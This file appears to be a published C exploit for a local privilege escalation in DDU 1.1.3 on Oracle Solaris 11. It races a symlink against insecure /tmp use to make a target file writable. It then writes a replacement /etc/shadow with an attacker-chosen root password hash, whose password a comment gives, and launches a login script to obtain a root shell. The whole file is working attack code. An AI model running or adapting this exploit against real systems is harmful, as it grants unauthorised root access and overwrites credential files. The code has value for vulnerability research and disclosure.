/*
Exploit for DDU 1.1.3 Oracle Solaris 11 x86.
Insecure use of /tmp leads to chmod 666 on targeted file.
Larry W. Cashdollar
2/2/2020
*/

#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>

void art (void);
int update_shadow(void);

int
main (int argc, char **argv)
{

  if (argc < 3)
    {
      printf ("Missing arguments! from -> to link\n");
      exit (0);
    }
  printf
    ("[+]     Exploit for DDU v1.1.3 Solaris 11     [+]\nLarry W. Cashdollar\nKeeping a symlink from %s to %s\n",
     argv[2], argv[1]);
  while (1)
    {
      symlink (argv[2], argv[1]);
      if (access (argv[2], W_OK) == 0)
	{
	  printf ("Success! %s is writable\n\nHere have a kitten\n", argv[2]);
	  art ();
          printf("Greetz to mudge, vladz, d1rtdiggler, respeto, indoushka, r00t, cDc, quine, x, dethveggie, dildog\n");
          printf("Ok, lets get a root prompt\n");
          if (!update_shadow()) {
          printf("Eewwww something went wrong! Check the status of /etc/shadow\n");
          exit(0);
          }
          system("cp /tmp/myshadow /etc/shadow"); //I could write a file copy function but nah.
          system("./login.exp");
	  exit (0);
	}
    }
  return (0);
}


void
art (void)
{
  printf ("         /\\_/\\\n");
  printf ("    ____/ o o \\\n");
  printf ("  /~____  =Ã¸= /\n");
  printf (" (______)__m_m)\n");
}


int
update_shadow(void)
{
  FILE *fin,*fout;
  char buffer[256];

  fin = fopen ("/etc/shadow.orig", "rw");
  fout = fopen ("/tmp/myshadow", "w+");
  if (fin == NULL)
    {
      printf ("Error fopen returned NULL!\n");
      return(-1);
    }
  while (fgets (buffer, 255, fin) != NULL)
    {
      if (strstr (buffer, "root:"))  //dduroot# is password
	fprintf (fout,"root:$5$rounds=10000$0vWemPu4$yJZ3147cU/OSvcP/RBViYyeNtpro.o0fnxlYPkIX9UB:18306::::::289952\n");
      else
	fprintf (fout,"%s", buffer);

    }
  fclose (fin);
  fclose (fout);
  return (0);
}
